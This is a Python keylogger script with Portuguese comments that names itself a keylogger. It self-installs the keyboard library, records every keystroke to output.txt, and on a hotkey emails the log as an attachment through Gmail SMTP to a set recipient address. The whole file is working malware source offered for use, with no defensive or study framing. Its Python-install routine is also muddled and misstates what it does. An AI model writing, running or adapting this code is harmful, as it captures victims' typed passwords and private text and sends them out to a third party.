import subprocess
import sys

def install_python():
    print("Python não encontrado. Iniciando a instalação...")
    subprocess.check_call([sys.executable, "-m", "ensurepip", "--default-pip"])
    print("Python foi instalado com sucesso!")

try:
    import sys
    import platform
    if sys.version_info < (3, 6) or platform.system() != "Windows":
        install_python()
    else:
        print("Python já está instalado.")
except ImportError:
    install_python()

def install_keyboard():
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "keyboard"])
        print("Biblioteca keyboard instalada com sucesso!")
    except Exception as e:
        print("Erro ao instalar a biblioteca keyboard:", str(e))

try:
    import keyboard
except ImportError:
    print("Biblioteca keyboard não encontrada. Iniciando a instalação...")
    install_keyboard()
    import keyboard

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
import atexit

# Configurações do email (Gmail)
smtp_server = 'smtp.gmail.com'
smtp_port = 587  # Porta para TLS (ou 465 para SSL)
smtp_username = 'seu_email@gmail.com'  # Substitua pelo seu email
smtp_password = 'sua_senha'  # Substitua pela sua senha
sender_email = 'seu_email@gmail.com'  # Substitua pelo seu email
receiver_email = 'email_destinatario@gmail.com'  # Substitua pelo email do destinatário

log_file = "output.txt"

# Limpar o arquivo de log
def clear_log_file():
    try:
        with open(log_file, "w") as f:
            f.truncate(0)
            print("Arquivo de log limpo.")
    except Exception as e:
        print("Erro ao limpar o arquivo de log:", str(e))

# Limpar o arquivo de log ao inicializar o programa
clear_log_file()

def on_key_event(e):
    with open(log_file, "a") as f:
        if e.event_type == keyboard.KEY_DOWN:
            if e.name == "space":
                f.write("\n")
            else:
                f.write(e.name)
            f.flush()

def close_log_file():
    keyboard.unhook_all()
    print("Fechando arquivo de log...")
    try:
        with open(log_file, "a") as f:
            f.write("\nPrograma encerrado.\n")
    except Exception as e:
        print("Erro ao fechar o arquivo de log:", str(e))

def send_email(subject, message, attachment_path=None):
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.attach(MIMEText(message, 'plain'))

    if attachment_path:
        with open(attachment_path, 'rb') as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            part.add_header('Content-Disposition', f'attachment; filename= {attachment_path}')
            msg.attach(part)

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(smtp_username, smtp_password)
        server.sendmail(sender_email, receiver_email, msg.as_string())
        server.quit()
        print("Email enviado com sucesso!")
    except Exception as e:
        print("Erro ao enviar o email:", str(e))

def stop_program(e):
    if all(keyboard.is_pressed(key) for key in ["ctrl", "shift", "q"]):
        close_log_file()
        send_email("Arquivo de Log", "Aqui está o arquivo de log gerado pelo keylogger.", log_file)
        print("Programa encerrado pelo usuário.")
        sys.exit(0)  # Usando sys.exit() para encerrar o programa

atexit.register(close_log_file)
keyboard.hook(on_key_event)
keyboard.hook(stop_program)

print("Pressione Ctrl + Shift + Q para encerrar o programa.")
keyboard.wait()  # Aguardar indefinidamente
